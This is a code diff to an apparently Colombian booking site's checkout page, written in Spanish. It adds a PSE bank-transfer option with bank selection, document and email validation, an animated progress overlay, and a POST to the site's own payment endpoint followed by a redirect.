@@ -464,6 +464,18 @@
             animation: slideUp 0.3s ease;
         }
 
+        .pse-field-error {
+            display: block;
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .pse-form input.invalid,
+        .pse-form select.invalid {
+            border-color: #e74c3c;
+        }
+
         /* Summary Card */
         .summary-card {
             background: white;
@@ -820,6 +832,209 @@
             transform: translateY(-2px);
             box-shadow: 0 4px 15px rgba(0, 82, 156, 0.3);
         }
+
+        /* PSE Bank Overlay */
+        .pse-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .pse-overlay.visible {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .pse-overlay-content {
+            text-align: center;
+            padding: 40px;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .pse-bank-logo {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #00529c 0%, #002E5D 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 28px;
+            box-shadow: 0 0 40px rgba(0, 82, 156, 0.5), 0 0 80px rgba(0, 82, 156, 0.3);
+            animation: pulseLogo 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseLogo {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 40px rgba(0, 82, 156, 0.5), 0 0 80px rgba(0, 82, 156, 0.3);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 50px rgba(0, 82, 156, 0.7), 0 0 100px rgba(0, 82, 156, 0.4);
+            }
+        }
+
+        .pse-bank-logo span {
+            color: white;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            padding: 8px;
+            line-height: 1.2;
+        }
+
+        .pse-overlay-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .pse-overlay-message {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 32px;
+            line-height: 1.6;
+            min-height: 48px;
+        }
+
+        /* Loading spinner para PSE */
+        .pse-spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 24px;
+            position: relative;
+        }
+
+        .pse-spinner::before,
+        .pse-spinner::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+        }
+
+        .pse-spinner::before {
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .pse-spinner::after {
+            width: 100%;
+            height: 100%;
+            border: 3px solid transparent;
+            border-top-color: #00529c;
+            animation: spinPSE 1s linear infinite;
+        }
+
+        @keyframes spinPSE {
+            to { transform: rotate(360deg); }
+        }
+
+        .pse-progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .pse-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00529c 0%, #00a8ff 50%, #00529c 100%);
+            background-size: 200% 100%;
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 2px;
+            animation: shimmer 2s linear infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        .pse-step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .pse-step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .pse-step-dot.active {
+            background: #00a8ff;
+            transform: scale(1.4);
+            box-shadow: 0 0 10px rgba(0, 168, 255, 0.5);
+        }
+
+        .pse-step-dot.completed {
+            background: #27ae60;
+        }
+
+        .pse-security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 28px;
+            padding: 12px 16px;
+            background: rgba(39, 174, 96, 0.1);
+            border: 1px solid rgba(39, 174, 96, 0.3);
+            border-radius: 8px;
+            font-size: 12px;
+            color: #27ae60;
+        }
+
+        .pse-security-note svg {
+            flex-shrink: 0;
+        }
+
+        /* Mensajes animados */
+        .pse-loading-dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
+        }
+
+        .pse-time-elapsed {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 16px;
+        }
     </style>
 </head>
 <body>
@@ -984,16 +1199,52 @@
                 <label>Selecciona tu banco</label>
                 <select id="bankSelect">
                     <option value="">Seleccionar banco...</option>
-                    <option value="bancolombia">Bancolombia</option>
-                    <option value="davivienda">Davivienda</option>
-                    <option value="bbva">BBVA</option>
-                    <option value="bogota">Banco de Bogotá</option>
-                    <option value="occidente">Banco de Occidente</option>
-                    <option value="popular">Banco Popular</option>
-                    <option value="avvillas">AV Villas</option>
-                    <option value="nequi">Nequi</option>
-                    <option value="daviplata">Daviplata</option>
+                    <option value="ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
+                    <option value="BAN100">BAN100</option>
+                    <option value="BANCAMIA S.A.">BANCAMIA S.A.</option>
+                    <option value="BANCO AGRARIO">BANCO AGRARIO</option>
+                    <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
+                    <option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
+                    <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
+                    <option value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
+                    <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
+                    <option value="BANCO FALABELLA">BANCO FALABELLA</option>
+                    <option value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
+                    <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
+                    <option value="BANCO ITAU">BANCO ITAU</option>
+                    <option value="BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                    <option value="BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
+                    <option value="BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
+                    <option value="BANCO POPULAR">BANCO POPULAR</option>
+                    <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
+                    <option value="BANCO SERFINANZA">BANCO SERFINANZA</option>
+                    <option value="BANCO UNION">BANCO UNION antes GIROS</option>
+                    <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+                    <option value="BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
+                    <option value="BOLD CF">BOLD CF</option>
+                    <option value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                    <option value="CITIBANK">CITIBANK</option>
+                    <option value="COINK SA">COINK SA</option>
+                    <option value="COLTEFINANCIERA">COLTEFINANCIERA</option>
+                    <option value="CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
+                    <option value="COTRAFA">COTRAFA</option>
+                    <option value="Crezcamos-MOSi">Crezcamos-MOSí</option>
+                    <option value="DALE">DALE</option>
+                    <option value="DING">DING</option>
+                    <option value="FINANCIERA JURISCOOP">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
+                    <option value="GLOBAL66">GLOBAL66</option>
+                    <option value="IRIS">IRIS</option>
+                    <option value="JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA</option>
+                    <option value="LULO BANK">LULO BANK</option>
+                    <option value="MOVII S.A.">MOVII S.A.</option>
+                    <option value="NEQUI">NEQUI</option>
+                    <option value="NU">NU</option>
+                    <option value="POWWI">POWWI</option>
+                    <option value="RAPPIPAY">RAPPIPAY</option>
+                    <option value="UALA">UALÁ</option>
                 </select>
+                <span class="pse-field-error" id="bankError" style="display: none;">Debes seleccionar un banco para continuar</span>
             </div>
             <div class="form-group">
                 <label>Tipo de persona</label>
@@ -1001,6 +1252,16 @@
                     <option value="natural">Persona Natural</option>
                     <option value="juridica">Persona Jurídica</option>
                 </select>
+            </div>
+            <div class="form-group">
+                <label>Número de documento</label>
+                <input type="text" id="pseDocumento" placeholder="Número de cédula o NIT" maxlength="20">
+                <span class="pse-field-error" id="documentoError" style="display: none;">Ingresa un número de documento válido</span>
+            </div>
+            <div class="form-group">
+                <label>Correo electrónico</label>
+                <input type="email" id="pseCorreo" placeholder="tucorreo@ejemplo.com">
+                <span class="pse-field-error" id="correoError" style="display: none;">Ingresa un correo electrónico válido</span>
             </div>
         </div>
 
@@ -1092,6 +1353,34 @@
         </div>
     </div>
 
+    <!-- PSE Bank Overlay -->
+    <div class="pse-overlay" id="pseOverlay">
+        <div class="pse-overlay-content">
+            <div class="pse-spinner"></div>
+            <div class="pse-bank-logo">
+                <span id="pseBankName">BANCO</span>
+            </div>
+            <h3 class="pse-overlay-title" id="pseOverlayTitle">Conectando con tu banco<span class="pse-loading-dots"></span></h3>
+            <p class="pse-overlay-message" id="pseOverlayMessage">Estamos estableciendo una conexión segura con tu entidad bancaria.</p>
+            <div class="pse-progress">
+                <div class="pse-progress-bar" id="pseProgressBar"></div>
+            </div>
+            <div class="pse-step-indicator">
+                <div class="pse-step-dot" id="pseStep1"></div>
+                <div class="pse-step-dot" id="pseStep2"></div>
+                <div class="pse-step-dot" id="pseStep3"></div>
+                <div class="pse-step-dot" id="pseStep4"></div>
+            </div>
+            <div class="pse-security-note">
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="#27ae60">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                </svg>
+                <span>Transacción protegida por PSE - ACH Colombia</span>
+            </div>
+            <div class="pse-time-elapsed" id="pseTimeElapsed"></div>
+        </div>
+    </div>
+
     <script>
         let selectedPayment = 'card';
         let timeLeft = 10 * 60;
@@ -1100,7 +1389,99 @@
             loadBookingData();
             startCountdown();
             setupCardInputs();
+            setupPSEValidation();
         });
+
+        function setupPSEValidation() {
+            const bankSelect = document.getElementById('bankSelect');
+            const bankError = document.getElementById('bankError');
+            const pseDocumento = document.getElementById('pseDocumento');
+            const pseCorreo = document.getElementById('pseCorreo');
+
+            bankSelect.addEventListener('change', function() {
+                if (this.value) {
+                    bankError.style.display = 'none';
+                    this.classList.remove('invalid');
+                }
+            });
+
+            pseDocumento.addEventListener('input', function() {
+                // Solo permitir números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length >= 5) {
+                    document.getElementById('documentoError').style.display = 'none';
+                    this.classList.remove('invalid');
+                }
+            });
+
+            pseCorreo.addEventListener('input', function() {
+                if (validateEmail(this.value)) {
+                    document.getElementById('correoError').style.display = 'none';
+                    this.classList.remove('invalid');
+                }
+            });
+        }
+
+        // Funciones de sanitización y validación
+        function sanitizeInput(input) {
+            if (!input) return '';
+            // Remover caracteres peligrosos y solo permitir alfanuméricos básicos
+            return String(input)
+                .replace(/[<>\"'&\\\/\(\)\{\}\[\];:]/g, '')
+                .trim();
+        }
+
+        function sanitizeEmail(email) {
+            if (!email) return '';
+            // Solo permitir caracteres válidos en email
+            return String(email)
+                .toLowerCase()
+                .replace(/[^a-z0-9@._\-]/g, '')
+                .trim();
+        }
+
+        function sanitizeNumeric(input) {
+            if (!input) return '';
+            // Solo números
+            return String(input).replace(/[^0-9]/g, '');
+        }
+
+        function validateEmail(email) {
+            const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailRegex.test(email);
+        }
+
+        function validatePSEForm() {
+            let isValid = true;
+            const bankSelect = document.getElementById('bankSelect');
+            const pseDocumento = document.getElementById('pseDocumento');
+            const pseCorreo = document.getElementById('pseCorreo');
+
+            // Validar banco
+            if (!bankSelect.value) {
+                document.getElementById('bankError').style.display = 'block';
+                bankSelect.classList.add('invalid');
+                isValid = false;
+            }
+
+            // Validar documento (mínimo 5 dígitos)
+            const documento = sanitizeNumeric(pseDocumento.value);
+            if (documento.length < 5) {
+                document.getElementById('documentoError').style.display = 'block';
+                pseDocumento.classList.add('invalid');
+                isValid = false;
+            }
+
+            // Validar correo
+            const correo = sanitizeEmail(pseCorreo.value);
+            if (!validateEmail(correo)) {
+                document.getElementById('correoError').style.display = 'block';
+                pseCorreo.classList.add('invalid');
+                isValid = false;
+            }
+
+            return isValid;
+        }
 
         function loadBookingData() {
             const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
@@ -1228,27 +1609,227 @@
 
         function processPayment() {
             const btn = document.getElementById('payBtn');
-            btn.classList.add('loading');
 
-            // Show loading
+            // Validación para PSE
+            if (selectedPayment === 'pse') {
+                if (!validatePSEForm()) {
+                    // Hacer focus en el primer campo con error
+                    const firstError = document.querySelector('.pse-form .invalid');
+                    if (firstError) firstError.focus();
+                    return;
+                }
+
+                // Iniciar flujo PSE
+                processPSEPayment();
+                return;
+            }
+
+            // Flujo normal para otros métodos de pago
+            btn.classList.add('loading');
             document.getElementById('loadingOverlay').classList.add('visible');
 
-            // Simulate payment processing
             setTimeout(function() {
                 document.getElementById('loadingOverlay').classList.remove('visible');
                 btn.classList.remove('loading');
-
-                // Generate reservation code
-                const code = 'EB-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-                document.getElementById('reservationCode').textContent = code;
-
-                // Show success modal
-                document.getElementById('successModal').classList.add('visible');
-
-                // Clear booking data
-                localStorage.removeItem('bookingData');
-                localStorage.removeItem('tripData');
+                showPaymentSuccess();
             }, 3000);
+        }
+
+        // Variables globales para PSE
+        let pseMessageInterval = null;
+        let pseTimeInterval = null;
+        let pseStartTime = null;
+
+        const pseLoadingMessages = [
+            { title: 'Conectando con tu banco', message: 'Estableciendo conexión segura con tu entidad bancaria...' },
+            { title: 'Verificando información', message: 'Validando los datos de tu transacción...' },
+            { title: 'Procesando solicitud', message: 'Tu banco está procesando la solicitud de pago...' },
+            { title: 'Comunicación en curso', message: 'Intercambiando información con la red PSE...' },
+            { title: 'Espera un momento', message: 'Este proceso puede tomar hasta 1 minuto, no cierres esta ventana...' },
+            { title: 'Casi listo', message: 'Finalizando la comunicación con tu banco...' },
+            { title: 'Generando transacción', message: 'Preparando el enlace seguro para tu pago...' },
+            { title: 'Conectando con PSE', message: 'Estableciendo canal seguro con ACH Colombia...' },
+        ];
+
+        function startPSELoadingAnimation(bankName) {
+            let messageIndex = 0;
+            pseStartTime = Date.now();
+
+            // Rotar mensajes cada 5 segundos
+            pseMessageInterval = setInterval(function() {
+                messageIndex = (messageIndex + 1) % pseLoadingMessages.length;
+                const msg = pseLoadingMessages[messageIndex];
+                document.getElementById('pseOverlayTitle').innerHTML = msg.title + '<span class="pse-loading-dots"></span>';
+                document.getElementById('pseOverlayMessage').textContent = msg.message;
+            }, 5000);
+
+            // Actualizar tiempo transcurrido cada segundo
+            pseTimeInterval = setInterval(function() {
+                const elapsed = Math.floor((Date.now() - pseStartTime) / 1000);
+                const minutes = Math.floor(elapsed / 60);
+                const seconds = elapsed % 60;
+                const timeText = minutes > 0
+                    ? `${minutes}:${seconds.toString().padStart(2, '0')} transcurrido`
+                    : `${seconds} segundos`;
+                document.getElementById('pseTimeElapsed').textContent = timeText;
+            }, 1000);
+        }
+
+        function stopPSELoadingAnimation() {
+            if (pseMessageInterval) {
+                clearInterval(pseMessageInterval);
+                pseMessageInterval = null;
+            }
+            if (pseTimeInterval) {
+                clearInterval(pseTimeInterval);
+                pseTimeInterval = null;
+            }
+        }
+
+        function processPSEPayment() {
+            const btn = document.getElementById('payBtn');
+            btn.classList.add('loading');
+
+            // Obtener y sanitizar datos del formulario
+            const bankSelect = document.getElementById('bankSelect');
+            const bankCode = sanitizeInput(bankSelect.value);
+            const bankName = bankSelect.options[bankSelect.selectedIndex].text;
+            const documento = sanitizeNumeric(document.getElementById('pseDocumento').value);
+            const correo = sanitizeEmail(document.getElementById('pseCorreo').value);
+
+            // Obtener el monto total sin formato
+            const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
+            let amount = bookingData.totalPrice || 149000;
+            const passengerCount = Array.isArray(bookingData.passengers || bookingData.selectedSeats)
+                ? (bookingData.passengers || bookingData.selectedSeats).length
+                : 1;
+            if (bookingData.insurance) {
+                amount += 2900 * passengerCount;
+            }
+
+            const pseOverlay = document.getElementById('pseOverlay');
+            const progressBar = document.getElementById('pseProgressBar');
+
+            // Configurar overlay con nombre del banco
+            document.getElementById('pseBankName').textContent = bankName.length > 12
+                ? bankName.substring(0, 12) + '...'
+                : bankName;
+
+            // Mostrar overlay PSE
+            pseOverlay.classList.add('visible');
+
+            // Resetear indicadores
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById('pseStep' + i).classList.remove('active', 'completed');
+            }
+            progressBar.style.width = '10%';
+            document.getElementById('pseTimeElapsed').textContent = '';
+
+            // Paso 1: Conectando con el banco
+            document.getElementById('pseStep1').classList.add('active');
+            document.getElementById('pseOverlayTitle').innerHTML = 'Conectando con ' + bankName + '<span class="pse-loading-dots"></span>';
+            document.getElementById('pseOverlayMessage').textContent = 'Estableciendo conexión segura con tu entidad bancaria...';
+
+            // Iniciar animación de mensajes rotativos
+            startPSELoadingAnimation(bankName);
+
+            // Animar la barra de progreso gradualmente mientras espera
+            let progress = 10;
+            const progressInterval = setInterval(function() {
+                if (progress < 85) {
+                    progress += Math.random() * 3;
+                    progressBar.style.width = Math.min(progress, 85) + '%';
+
+                    // Actualizar pasos según progreso
+                    if (progress > 25 && !document.getElementById('pseStep1').classList.contains('completed')) {
+                        document.getElementById('pseStep1').classList.remove('active');
+                        document.getElementById('pseStep1').classList.add('completed');
+                        document.getElementById('pseStep2').classList.add('active');
+                    }
+                    if (progress > 55 && !document.getElementById('pseStep2').classList.contains('completed')) {
+                        document.getElementById('pseStep2').classList.remove('active');
+                        document.getElementById('pseStep2').classList.add('completed');
+                        document.getElementById('pseStep3').classList.add('active');
+                    }
+                }
+            }, 1000);
+
+            // Preparar datos para el request
+            const params = new URLSearchParams({
+                amount: amount,
+                bankCode: bankCode,
+                Correo: correo,
+                Documento: documento
+            });
+
+            // Hacer request a la API
+            fetch('/api/pse.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: params.toString()
+            })
+            .then(response => {
+                clearInterval(progressInterval);
+                stopPSELoadingAnimation();
+
+                // Completar pasos pendientes
+                document.getElementById('pseStep1').classList.remove('active');
+                document.getElementById('pseStep1').classList.add('completed');
+                document.getElementById('pseStep2').classList.remove('active');
+                document.getElementById('pseStep2').classList.add('completed');
+                document.getElementById('pseStep3').classList.remove('active');
+                document.getElementById('pseStep3').classList.add('completed');
+                document.getElementById('pseStep4').classList.add('active');
+                progressBar.style.width = '90%';
+
+                document.getElementById('pseOverlayTitle').innerHTML = 'Respuesta recibida';
+                document.getElementById('pseOverlayMessage').textContent = 'Procesando respuesta del banco...';
+
+                if (!response.ok) {
+                    throw new Error('Error en la respuesta del servidor');
+                }
+                return response.json();
+            })
+            .then(data => {
+                // Verificar que la respuesta contenga la URL
+                if (data && data.URL) {
+                    progressBar.style.width = '100%';
+                    document.getElementById('pseStep4').classList.remove('active');
+                    document.getElementById('pseStep4').classList.add('completed');
+                    document.getElementById('pseOverlayTitle').innerHTML = '¡Transacción lista!';
+                    document.getElementById('pseOverlayMessage').textContent = 'Redirigiendo al portal seguro de ' + bankName + '...';
+
+                    // Redirigir a la URL de PSE
+                    setTimeout(function() {
+                        window.location.href = data.URL;
+                    }, 2000);
+                } else {
+                    throw new Error('No se recibió URL de PSE');
+                }
+            })
+            .catch(error => {
+                clearInterval(progressInterval);
+                stopPSELoadingAnimation();
+                console.error('Error PSE:', error);
+                pseOverlay.classList.remove('visible');
+                btn.classList.remove('loading');
+                alert('Hubo un error al procesar tu pago PSE. Por favor intenta nuevamente.\n\nError: ' + error.message);
+            });
+        }
+
+        function showPaymentSuccess() {
+            // Generar código de reserva
+            const code = 'EB-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            document.getElementById('reservationCode').textContent = code;
+
+            // Mostrar modal de éxito
+            document.getElementById('successModal').classList.add('visible');
+
+            // Limpiar datos de reserva
+            localStorage.removeItem('bookingData');
+            localStorage.removeItem('tripData');
         }
     </script>
 </body>
